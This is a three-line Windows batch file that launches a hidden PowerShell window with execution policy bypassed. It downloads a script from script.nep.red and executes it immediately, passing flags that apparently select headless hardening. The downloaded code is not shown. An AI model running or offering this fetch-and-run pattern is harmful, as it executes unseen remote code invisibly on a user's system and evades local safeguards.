@echo off
start "" /min powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& ([scriptblock]::Create((irm https://script.nep.red))) -Headless -NoElevate -Harden"
exit /b
